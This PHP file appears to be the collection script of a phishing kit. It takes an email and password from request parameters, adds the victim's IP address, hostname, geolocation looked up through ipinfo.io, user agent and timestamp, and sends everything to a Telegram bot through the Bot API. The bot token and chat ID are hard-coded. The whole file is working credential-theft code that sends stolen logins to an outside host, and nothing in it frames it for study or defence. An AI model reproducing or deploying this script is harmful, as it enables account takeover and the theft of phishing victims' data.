<?php  
header('Access-Control-Allow-Origin: *');

$ip=$_SERVER["REMOTE_ADDR"];
$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$hostname=gethostbyaddr($ip);
$agent=$_SERVER['HTTP_USER_AGENT'];


if (!empty($_SERVER['HTTP_CLIENT_IP']))  
{
    $oip=$_SERVER['HTTP_CLIENT_IP'];
}
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   
{
    $oip=$_SERVER['HTTP_X_FORWARDED_FOR'];
}
else
{
    $oip="same";
}

$json       = file_get_contents("http://ipinfo.io/{$ip}");
$details    = json_decode($json);

$address = $details->org.' '.$details->city.' '.$details->country;   

$msg .= "==================================\n";
$msg .= "Email : ".$_GET['userName']."\n";
$msg .= "Password : ".$_GET['password']."\n";

$msg .= "IP = ".$ip   ." HostName= ".$hostname."\n";
$msg .= "Original IP = ".$oip."\n";
$msg .= "Address = ".$address."\n";
$msg .= "User-Agent = ".$agent."\n";
$msg .= "Time = ".$time."\n";
$msg .= "Date = ".$date."\n";
$msg .= "==================================\n";

$botToken="5608993798:AAFtmahHOZy83FLg038l4a8nqlC30m9jMsI";

$website="https://api.telegram.org/bot".$botToken;
$chatId=5555996269;  //** ===>>>NOTE: this chatId MUST be the chat_id of a person, NOT another bot chatId !!!**
$params=[
  'chat_id'=>$chatId, 
  'text'=> $msg,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

echo $result;